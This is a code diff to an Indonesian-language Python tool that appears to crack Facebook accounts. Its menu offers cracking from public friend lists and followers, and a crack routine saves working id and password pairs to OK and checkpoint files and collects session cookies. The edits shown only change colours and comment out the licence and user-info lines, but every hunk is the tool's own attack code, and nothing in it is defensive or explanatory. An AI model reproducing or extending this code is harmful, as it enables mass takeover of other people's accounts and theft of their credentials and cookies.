@@ -187,7 +187,7 @@ def menu():
         maile = (mailer+'xxxxx@'+mailert2)
         bergabung = wk['joined']
         kadaluarsa = wk['expired']
-        status = ('%sPremium [%sPro%s]'%(O,P,O))
+        status = ('%sPremium [%sPro%s]'%(O,K,O))
         kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O))
         pro = ''
         upgrade = 'Ganti License Key'
@@ -199,9 +199,9 @@ def menu():
         kunci = '-'
         bergabung = '-'
         kadaluarsa = '-'
-        pro = ("%s[%sPro%s]"%(O,P,O))
+        pro = ("%s[%sPro%s]"%(O,K,O))
         upgrade = ('Upgrade To Version %s-'%(O))
-        jid = ('%s[%s5000%s]'%(O,P,O))
+        jid = ('%s[%s5000%s]'%(O,K,O))
     try:
         token = open("token.txt","r").read()
         x = requests.get("https://graph.facebook.com/me?access_token=" + token)
@@ -230,11 +230,11 @@ def menu():
     print('%s╠══[%s•%s] %sIP : %s'%(O,K,O,H,ip))
     print('%s║'%(O))
     print('%s╠══[%s•%s] %sStatus : %s'%(O,K,O,P,status))
-    print('%s╠══[%s•%s] %sNama : %s'%(O,K,O,P,users))
-    print('%s╠══[%s•%s] %sEmail : %s'%(O,K,O,P,maile))
-    print('%s╠══[%s•%s] %sKunci : %s'%(O,K,O,P,kunci))
-    print('%s╠══[%s•%s] %sBergabung : %s'%(O,K,O,P,bergabung))
-    print('%s╠══[%s•%s] %sKedaluarsa : %s'%(O,K,O,P,kadaluarsa))
+    #print('%s╠══[%s•%s] %sNama : %s'%(O,K,O,P,users))
+    #print('%s╠══[%s•%s] %sEmail : %s'%(O,K,O,P,maile))
+    #print('%s╠══[%s•%s] %sKunci : %s'%(O,K,O,P,kunci))
+    #print('%s╠══[%s•%s] %sBergabung : %s'%(O,K,O,P,bergabung))
+    #print('%s╠══[%s•%s] %sKedaluarsa : %s'%(O,K,O,P,kadaluarsa))
     print('%s║'%(O))
     print('%s╠══[%s1%s] %sCrack Dari Teman Publik %s'%(O,K,O,H,jid))
     print('%s╠══[%s2%s] %sCrack Dari Followers %s'%(O,K,O,H,jid))
@@ -1131,7 +1131,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    print("\r%s[%sOK%s] %s • %s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sOK%s] %s • %s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id"))))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
@@ -1167,7 +1167,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    print("\r%s[%sOK%s] %s • %s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id"))))
+                    print("\r%s[%sOK%s] %s • %s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id"))))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1204,7 +1204,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1245,7 +1245,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
@@ -1283,7 +1283,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     self.ada.append("%s•%s"%(fl.get("id"),i))
                     open("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
@@ -1324,7 +1324,7 @@ class crack:
                     open("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                     break
                 elif log.get("status")=="success":
-                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(H,K,H,fl.get("id"),i,tahun(fl.get("id")),P)
+                    h_ok = "\r%s[%sOK%s] %s • %s%s%s     "%(O,H,O,fl.get("id"),i,tahun(fl.get("id")),P)
                     cek_apk(h_ok,koki(log.get("cookies")))
                     print("")
                     self.ada.append("%s•%s"%(fl.get("id"),i))
